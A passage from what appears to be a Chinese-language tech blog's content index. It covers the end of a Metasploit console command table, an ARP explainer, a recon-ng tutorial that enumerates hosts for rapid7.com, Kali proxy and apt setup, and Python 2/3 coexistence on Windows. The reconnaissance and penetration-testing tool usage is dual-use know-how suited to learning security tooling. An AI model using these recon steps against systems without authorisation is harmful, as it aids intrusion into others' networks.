    线程查看和操作后台线程<br>tip           Show a useful productivity tip<br>unload        卸载框架插件<br>unset         取消设置一个或多个特定于上下文的变量<br>unsetg        取消设置一个或多个全局变量<br>version       显示框架和控制台库版本号</p><p><strong>模块命令</strong> </p><p>指令       描述</p><hr><p>advanced      显示一个或多个模块的高级选项<br>back          从当前上下文返回<br>clearm        Clear the module stack<br>info          显示有关一个或多个模块的信息<br>listm         List the module stack<br>loadpath      路径从路径搜索并加载模块<br>options       显示全局选项或一个或多个模块<br>popm          将最新的模块从堆栈中弹出并使其处于活动状态<br>previous      将最新的模块从堆栈中弹出并使其处于活动状态<br>pushm         将活动或模块列表推入模块堆栈<br>reload_all    从所有定义的模块路径重新加载所有模块<br>search        搜索模块名称和描述<br>show          显示给定类型的模块或所有模块<br>use           按名称选择模块 or search term/index</p><p><strong>工作命令</strong> </p><p>Command       Description</p><hr><p>handler       作为作业启动负载处理程序<br>jobs          作为作业启动负载处理程序<br>kill          杀死一个工作<br>rename_job    重命名作业</p><p><strong>资源脚本命令</strong> </p><p>Command       Description</p><hr><p>makerc        保存从开始到文件输入的命令<br>resource      运行存储在文件中的命令</p><p><strong>数据库后端命令</strong> </p><p>Command           Description</p><hr><p>analyze           Analyze database information about a specific address or address range<br>db_connect        连接到现有的数据库<br>db_disconnect     断开与当前数据库实例的连接<br>db_export         导出包含数据库内容的文件<br>db_import         导入扫描结果文件（文件类型将被自动检测）<br>db_nmap           执行nmap并自动记录输出<br>db_rebuild_cache  重建数据库存储的模块高速缓存<br>db_remove         Remove the saved data service entry<br>db_save           Save the current data service connection as the default to reconnect on startup<br>db_status         显示当前的数据库状态<br>hosts             列出数据库中的所有主机<br>loot              列出数据库中的所有战利品<br>notes             列出数据库中的所有笔记<br>services          列出数据库中的所有服务<br>vulns             列出数据库中的所有漏洞<br>workspace         在数据库工作区之间切换</p><p><strong>凭证后端命令</strong></p><p>Command       Description</p><hr><p>creds         列出数据库中的所有凭据</p><p><strong>开发人员的命令</strong> </p><p>Command       Description</p><hr><p>edit          使用首选编辑器编辑当前模块或文件<br>irb           在当前环境中打开一个交互式Ruby shell<br>log           日志显示框架。如果可能的话，将日志分页到最后<br>pry           在当前模块或框架上打开pry调试器<br>reload_lib    从指定的路径重新加载Ruby库文件</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>arp协议之跨网段和同网段</title>
      <link href="/categories/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/arp%E5%8D%8F%E8%AE%AE%E4%B9%8B%E8%B7%A8%E7%BD%91%E6%AE%B5%E5%92%8C%E5%90%8C%E7%BD%91%E6%AE%B5/"/>
      <url>/categories/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/arp%E5%8D%8F%E8%AE%AE%E4%B9%8B%E8%B7%A8%E7%BD%91%E6%AE%B5%E5%92%8C%E5%90%8C%E7%BD%91%E6%AE%B5/</url>
      
        <content type="html"><![CDATA[<p><a href="http://www.360doc.com/content/18/0723/19/11935121_772679821.shtml" target="_blank" rel="noopener">http://www.360doc.com/content/18/0723/19/11935121_772679821.shtml</a> </p><a id="more"></a><h1 id="ARP协议属于TCP-IP分层中的哪一层"><a href="#ARP协议属于TCP-IP分层中的哪一层" class="headerlink" title="ARP协议属于TCP/IP分层中的哪一层"></a><strong>ARP</strong>协议属于TCP/IP分层中的哪一层</h1><p>ARP协议具体属于哪一层，有不同的说法</p><ul><li>从ARP的功能来看，我们知道ARP的主要是实现IP地址到MAC的映射，如果单就功能来说的话，ARP应该是属于链路层的协议。</li><li>但是从数据封装的角度来看，ARP协议应该属于网络层。因为ARP是基于Ethernet 协议，而且从以太网数据帧的格式来看，Ethernet协议里面有独立的Type类型，ARP是0x0806而IP协议的Type 为0x0800，从这个角度来看ARP协议是和IP协议平等的，所以它又属于网络层。我们好多教材上也是把ARP协议划到网络层。</li></ul><p><img src="tcpip_1.png" alt="tcpip_1"></p><h1 id="什么样的网络通信中才需要ARP协议"><a href="#什么样的网络通信中才需要ARP协议" class="headerlink" title="什么样的网络通信中才需要ARP协议"></a>什么样的网络通信中才需要<strong>ARP</strong>协议</h1><p>我们知道ARP的功能是实现IP地址到物理地址的映射，这里的物理地址是指MAC地址，那么问题是什么样的物理接口有MAC地址呢？答案是Ethernet接口，所以如果A和B通信的接口是Ethernet接口那么他们之间的通信才需要知道彼此的MAC地址，也就是说才需要ARP去获得MAC地址。换句话说:通信双方A与B的物理接口是Serial interface 且二层封装是PPP/HDLC就不需要ARP，因为PPP/HDLC封装头部信息没有MAC地址信息！</p><h1 id="ARP在同一个局域网内实现的流程"><a href="#ARP在同一个局域网内实现的流程" class="headerlink" title="ARP在同一个局域网内实现的流程"></a><strong>ARP</strong>在同一个局域网内实现的流程</h1><p>之前的文章已经说了，如果主机A要想通过B的IP地址确定其MAC地址并和B进行数据交互，需要按照ARP协议的”广播请求和单播应答”来确定主机B的MAC地址。流程我们重复一遍：</p><blockquote><p>1） A先查看自己的ARP高速缓存表中是否有B主机的MAC地址记录。</p><p>2） 如果A的ARP高速缓存表中有B的MAC地址记录，则直接通过这个MAC地址进行数据的传输。</p><p>3） 如果A主机的ARP高速缓存中没有B主机的记录，则会向局域网的所有主机广播一个ARP请求，寻找B主机的MAC地址。</p><p>4） 当B主机收到A主机广播的ARP请求后，就会直接给A主机回复一个ARP数据包。</p><p>5） 当A主机收到B主机发送过来的请求后，将B的MAC地址写入高速缓存中，然后通过该MAC地址，A主机向B主机进行数据的传输</p></blockquote><h1 id="ARP在局域网中跨网段主机间通讯的工作原理"><a href="#ARP在局域网中跨网段主机间通讯的工作原理" class="headerlink" title="ARP在局域网中跨网段主机间通讯的工作原理"></a><strong>ARP</strong>在局域网中<strong>跨网段</strong>主机间通讯的工作原理</h1><p>对于跨网段的ARP工作我们首先需要知道的是：</p><ul><li>ARP请求以广播发送、以单播回应</li><li>路由器隔离广播。每一个网段都是独立的广播域</li><li>跨越网段通信需要使用网关的mac地址</li></ul><p><img src="tcpic_2.png" alt="tcpic_2"></p><ul><li>A与B不在一个网段，A查询自己的路由表，知道如果想和B通信则必须通过gateway 来中转，所以会在与gateway 直连的接口（假定 Ethernet接口）上请求gateway 的MAC地址。 A主机先通过广播一个ARP请求，找到本网络中的一个路由器的MAC地址，然后将数据包直接给路由器。</li><li>当路由收到数据包后，如果B主机在同网络中的话，这时通过ARP找到B主机，然后把数据包给B主机。</li><li>如果B主机不和A主机发送数据的路由器在同一网络内的话，则路由器会通过ARP协议找到下一跳的路由器，然后把数据包发送到该路由上，以此类推。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> arp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>recon-ng工具详解</title>
      <link href="/categories/%E5%B7%A5%E5%85%B7/recon-ng%E5%B7%A5%E5%85%B7%E8%AF%A6%E8%A7%A3/"/>
      <url>/categories/%E5%B7%A5%E5%85%B7/recon-ng%E5%B7%A5%E5%85%B7%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>web信息搜索框架，基于python开发</p><p>使用方法：模块，数据库，报告</p><p>项目地址： <a href="https://github.com/lanmaster53/recon-ng" target="_blank" rel="noopener">https://github.com/lanmaster53/recon-ng</a> </p><a id="more"></a><h2 id="recon-ng-–hrlp"><a href="#recon-ng-–hrlp" class="headerlink" title="recon-ng –hrlp"></a>recon-ng –hrlp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-h, --<span class="built_in">help</span>        帮助显示此帮助消息并退出</span><br><span class="line">  -w workspace      加载/创建一个工作空间</span><br><span class="line">  -r filename       从资源文件加载命令</span><br><span class="line">  --no-version      禁用版本检查。在默认情况下已禁用</span><br><span class="line">  --no-analytics    禁用分析报告。默认情况下已经禁用</span><br><span class="line">  --no-marketplace  禁用远程模块管理</span><br><span class="line">  --stealth         禁用所有被动请求(- no-*)</span><br><span class="line">  --accessible      可访问的可用的输出</span><br><span class="line">  --version         显示当前版本</span><br></pre></td></tr></table></figure><h2 id="help"><a href="#help" class="headerlink" title="help"></a>help</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">back            退出当前上下文</span><br><span class="line">dashboard       显示活动的摘要</span><br><span class="line">db              与工作区的数据库接口</span><br><span class="line"><span class="built_in">exit</span>            退出框架</span><br><span class="line"><span class="built_in">help</span>            帮助显示此菜单</span><br><span class="line">index           创建模块索引(仅适用于dev)</span><br><span class="line">keys            密钥管理第三方资源凭据</span><br><span class="line">marketplace     接口与模块marketplace</span><br><span class="line">modules         接口与安装的模块</span><br><span class="line">options         管理当前上下文选项</span><br><span class="line">pdb             启动一个Python调试器会话(仅适用于dev)</span><br><span class="line">script          记录并执行命令脚本</span><br><span class="line">shell           执行shell命令</span><br><span class="line">show            显示了各种框架项</span><br><span class="line">snapshots       管理工作区快照</span><br><span class="line">spool           线轴输出到一个文件</span><br><span class="line">workspaces      管理工作区</span><br></pre></td></tr></table></figure><h2 id="查看所有模块"><a href="#查看所有模块" class="headerlink" title="查看所有模块"></a>查看所有模块</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">marketplace search</span><br></pre></td></tr></table></figure><h2 id="下载recon目录下的所有模块"><a href="#下载recon目录下的所有模块" class="headerlink" title="下载recon目录下的所有模块"></a>下载recon目录下的所有模块</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">marketplace install recon</span><br></pre></td></tr></table></figure><h2 id="查看所有已安装的模块"><a href="#查看所有已安装的模块" class="headerlink" title="查看所有已安装的模块"></a>查看所有已安装的模块</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">modules search</span><br></pre></td></tr></table></figure><h2 id="安装并运用某个模块"><a href="#安装并运用某个模块" class="headerlink" title="安装并运用某个模块"></a>安装并运用某个模块</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#更新索引</span></span><br><span class="line">marketplace refresh</span><br><span class="line"><span class="comment">#搜索</span></span><br><span class="line">marketplace search recon</span><br><span class="line"><span class="comment">#安装实例：hackertarget</span></span><br><span class="line">marketplace install recon/domains-hosts/hackertarget</span><br><span class="line"><span class="comment">#加载模块</span></span><br><span class="line">modules load recon/domains-hosts/hackertarget</span><br><span class="line"><span class="comment">#显示信息</span></span><br><span class="line">info</span><br><span class="line"><span class="comment">#设置参数</span></span><br><span class="line">options <span class="built_in">set</span> SOURCE rapid7.com</span><br><span class="line"><span class="comment">#执行</span></span><br><span class="line">run</span><br><span class="line"><span class="comment">#显示结果</span></span><br><span class="line">show hosts</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>kali代理</title>
      <link href="/categories/Linux/Kali-Linux/kali%E4%BB%A3%E7%90%86/"/>
      <url>/categories/Linux/Kali-Linux/kali%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>kali linux 网络代理设置</p><a id="more"></a><h2 id="tor代理"><a href="#tor代理" class="headerlink" title="tor代理"></a>tor代理</h2><ul><li>下载  <a href="https://www.torproject.org/download/" target="_blank" rel="noopener">https://www.torproject.org/download/</a></li><li>配置（configure）</li><li>Tor is censored in my cuntry</li><li>Select a bulit-in bridge 选择meek-azure </li><li>connect</li></ul><h2 id="更新源代理设置"><a href="#更新源代理设置" class="headerlink" title="更新源代理设置"></a>更新源代理设置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/etc/apt/apt.conf</span><br><span class="line">Acquire::ftp::proxy <span class="string">"ftp://127.0.0.1:8087/"</span>;</span><br><span class="line">Acquire::http::proxy <span class="string">"http://127.0.0.1:8087/"</span>;</span><br><span class="line">Acquire::https::proxy <span class="string">"https://127.0.0.1:8087/"</span>;</span><br><span class="line">Acquire::socks::proxy <span class="string">"https://127.0.0.1:8087/"</span>;</span><br></pre></td></tr></table></figure><h2 id="命令行代理设置"><a href="#命令行代理设置" class="headerlink" title="命令行代理设置"></a>命令行代理设置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/etc/bash.bashrc</span><br><span class="line"><span class="built_in">export</span> ftp_proxy=<span class="string">"ftp://user:password@proxyIP:port"</span></span><br><span class="line"><span class="built_in">export</span> http_proxy=<span class="string">"http://user:password@proxyIP:port"</span></span><br><span class="line"><span class="built_in">export</span> https_proxy=<span class="string">"https://user:password@proxyIP:port"</span></span><br><span class="line"><span class="built_in">export</span> socks_proxy=<span class="string">"https://user:password@proxyIP:port"</span></span><br></pre></td></tr></table></figure><h2 id="代理链"><a href="#代理链" class="headerlink" title="代理链"></a>代理链</h2><p>公开的代理服务器 </p><p>配置代理链</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/proxychains.conf</span><br><span class="line">proxychains 命令 <span class="comment">#命令走代理</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Kali Linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>kali更新升级,安装与卸载软件包</title>
      <link href="/categories/Linux/Kali-Linux/kali%E6%9B%B4%E6%96%B0%E5%8D%87%E7%BA%A7,%E5%AE%89%E8%A3%85%E4%B8%8E%E5%8D%B8%E8%BD%BD%E8%BD%AF%E4%BB%B6%E5%8C%85/"/>
      <url>/categories/Linux/Kali-Linux/kali%E6%9B%B4%E6%96%B0%E5%8D%87%E7%BA%A7,%E5%AE%89%E8%A3%85%E4%B8%8E%E5%8D%B8%E8%BD%BD%E8%BD%AF%E4%BB%B6%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<p>更新升级，安装软件</p><a id="more"></a><h2 id="更新升级命令"><a href="#更新升级命令" class="headerlink" title="更新升级命令"></a>更新升级命令</h2><ul><li>路径 </li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure><ul><li>添加源</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#kali官方源</span></span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line"><span class="comment">#中科大的源</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"><span class="comment">#浙江大学源</span></span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><ol><li>更新软件包索引文件</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure><ol start="2"><li>将更新的软件包下载下来</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get upgrade</span><br></pre></td></tr></table></figure><ol start="3"><li>版本更新</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get dist-upgrade//软件升级</span><br></pre></td></tr></table></figure><ul><li>更新系统</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt full-upgrade //通过卸载|安装|升级等方式来更新系统</span><br></pre></td></tr></table></figure><ul><li>自动卸载不需要的软件包</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get autoremove</span><br></pre></td></tr></table></figure><ul><li>自动清除软件包</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get autoclean</span><br></pre></td></tr></table></figure><ul><li>查看系统版本</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep VERSION /etc/os-release</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure><h2 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h2><ul><li>安装中文输入法</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ibus ibus-pinyin</span><br></pre></td></tr></table></figure><p>若提示如下，照做即可</p><p><img src="kali%E6%9B%B4%E6%96%B0%E5%8D%87%E7%BA%A7,%E5%AE%89%E8%A3%85%E4%B8%8E%E5%8D%B8%E8%BD%BD%E8%BD%AF%E4%BB%B6%E5%8C%85/ibus.png" alt="ibus"></p><ul><li>安装pip</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-pip</span><br></pre></td></tr></table></figure><ul><li>安装播放器parole</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install parole</span><br></pre></td></tr></table></figure><ul><li><del>安装falsh插件</del></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install flashplugin-nonfree</span><br></pre></td></tr></table></figure><ul><li>安装gdebi(图像化安装deb包)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gdebi</span><br></pre></td></tr></table></figure><p>当然在字符界面下，安装deb包命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -i xxxx.deb</span><br></pre></td></tr></table></figure><ul><li>下载bt</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qbittorrent</span><br></pre></td></tr></table></figure><ul><li>简便的程序开发环境geany</li></ul><p>puthon shell脚本..,它都可以</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install geany</span><br></pre></td></tr></table></figure><ul><li>字典</li></ul><p>翻译软件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install stardict</span><br></pre></td></tr></table></figure><p>词库下载<br><a href="http://download.huzheng.org/zh_CN/" target="_blank" rel="noopener">http://download.huzheng.org/zh_CN/</a><br>下载朗道词典</p><ul><li>文件差异比较</li></ul><p>图形化的工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install meld</span><br></pre></td></tr></table></figure><ul><li>字体</li></ul><p>习惯windows字体的可以更换这个</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ttf-wqy-microhei</span><br></pre></td></tr></table></figure><ul><li>查看chm文件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install kchmviewer</span><br></pre></td></tr></table></figure><ul><li><del>思维导图</del></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install freemind</span><br></pre></td></tr></table></figure><ul><li><del>显示网速</del></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install netspeed</span><br></pre></td></tr></table></figure><ul><li>路由追踪</li></ul><p>图形化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install mtr</span><br></pre></td></tr></table></figure><p>也可使用命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">traceroute</span><br></pre></td></tr></table></figure><ul><li>ftp客户端</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install filezilla filezilla-common</span><br></pre></td></tr></table></figure><ul><li>chromium浏览器</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install chromium</span><br></pre></td></tr></table></figure><ul><li>开发.net环境</li></ul><p>mono套件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install monodevelop mono-gmcs</span><br><span class="line">或 mono-xbuild mono-mcs mono-devel</span><br></pre></td></tr></table></figure><h2 id="安装与卸载软件命令"><a href="#安装与卸载软件命令" class="headerlink" title="安装与卸载软件命令"></a>安装与卸载软件命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get install software_name :安装软件</span><br><span class="line">apt-get --purge remove  software_name :卸载软件及其配置</span><br><span class="line">apt-get autoremove software_name:卸载软件及其依赖的安装包</span><br><span class="line">dpkg --list:罗列已安装软件</span><br></pre></td></tr></table></figure><h2 id="问题1-更新系统，空间不足"><a href="#问题1-更新系统，空间不足" class="headerlink" title="问题1:更新系统，空间不足"></a>问题1:更新系统，空间不足</h2><p>E: 您在 /var/cache/apt/archives/ 上没有足够的可用空间。<code>分区多份点</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get clean</span><br></pre></td></tr></table></figure><p>软链接到HOME下的一个目录即可，home下新建debs文件夹：<br>在某个空间大的分区建立一个目录，然后把/var/cache/apt/archives换成指向那个目录的软链接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo rm -rf /var/cache/apt/archives</span><br><span class="line">sudo ln -s “<span class="variable">$HOME</span>/debs” /var/cache/apt/archives</span><br></pre></td></tr></table></figure><p>s</p><h2 id="问题2：没有公钥"><a href="#问题2：没有公钥" class="headerlink" title="问题2：没有公钥"></a>问题2：没有公钥</h2><p>W: GPG 错误：<a href="http://archive.ubuntu.com/ubuntu" target="_blank" rel="noopener">http://archive.ubuntu.com/ubuntu</a> trusty Release: 由于没有公钥，无法验证下列签名： NO_PUBKEY 40976EAF437D05B5 NO_PUBKEY 3B4FE6ACC0B21F32</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys E40EBBA24FF2FC69</span><br></pre></td></tr></table></figure><p>注意<code>E40EBBA24FF2FC69</code>需替换为<code>40976EAF437D05B5</code> <code>3B4FE6ACC0B21F32</code>，也就是要与你的错误提示中的签名一致。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><h2 id="问题3："><a href="#问题3：" class="headerlink" title="问题3："></a>问题3：</h2><p>dpkg: 处理归档 /var/cache/apt/archives/openjdk-11-amd64.deb (–unpack)时出错：<br> 无法为 ‘./usr/lib/jvm/java-11-openjdk-amd64/lib/m’/usr/lib/jvm/java-11-openjdk-amd64/lib/modules.dp上没有空间)<br>dpkg-deb: 错误: 粘贴 子进程被信号(断开的管道) 终止<br>在处理时有错误发生：<br> /var/cache/apt/archives/openjdk-11-jre-headless_1<br>E: Sub-process /usr/bin/dpkg returned an error cod<br>root@fg:~# </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -i --force-overwrite /var/cache/apt/archives/某.deb</span><br></pre></td></tr></table></figure><h2 id="问题4-缺乏依赖"><a href="#问题4-缺乏依赖" class="headerlink" title="问题4:缺乏依赖"></a>问题4:缺乏依赖</h2><p>如缺依赖包，执行<code>apt-get install 依赖包名</code></p><p>按提示输入命令<code>apt --fix-broken install</code></p><p>再次执行<code>dpkg -i 文件名.deb</code></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Kali Linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>win下解决python2与3切换，pip共存</title>
      <link href="/categories/Windows/win%E4%B8%8B%E8%A7%A3%E5%86%B3python2%E4%B8%8E3%E5%88%87%E6%8D%A2%EF%BC%8Cpip%E5%85%B1%E5%AD%98/"/>
      <url>/categories/Windows/win%E4%B8%8B%E8%A7%A3%E5%86%B3python2%E4%B8%8E3%E5%88%87%E6%8D%A2%EF%BC%8Cpip%E5%85%B1%E5%AD%98/</url>
      
        <content type="html"><![CDATA[<p>Windows下解决python2与3切换，pip共存</p><a id="more"></a><h2 id="python2与3切换"><a href="#python2与3切换" class="headerlink" title="python2与3切换"></a>python2与3切换</h2><ol><li>安装py2，py3</li></ol><p>python官网:<a href="https://www.python.org/" target="_blank" rel="noopener">https://www.python.org/</a></p><ol start="2"><li>添加py2/py3的路径到系统变量</li></ol><p><img src="pyPath.png" alt="pyPath"></p><ol start="3"><li>修改python两个版本的的名字为python2和python3</li></ol><p><img src="py3.png" alt="py3">)<img src="py2.png" alt="py2"></p><ol start="4"><li>修改完成后去cmd命令行中测试，成功如下图</li></ol><p><img src="cmdpy.png" alt="cmdpy"></p><h2 id="pip共存"><a href="#pip共存" class="headerlink" title="pip共存"></a>pip共存</h2><ol><li>重新安装两个版本的pip （分别在各自的py环境下强制更新并安装pip ）</li></ol><p>重新安装pip2:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2  -m pip install --upgrade pip --force-reinstall</span><br></pre></td></tr></table></figure><p>重新安装pip3:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3  -m pip install --upgrade pip --force-reinstall</span><br></pre></td></tr></table></figure><ol start="2"><li>测试</li></ol><p><img src="pip23V.png" alt="pip23V"></p>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>wireshark详解</title>
      <link href="/categories/%E5%B7%A5%E5%85%B7/wireshark%E8%AF%A6%E8%A7%A3/"/>
      <url>/categories/%E5%B7%A5%E5%85%B7/wireshark%E8%AF%A6%E8%A7%A3/</url>
      
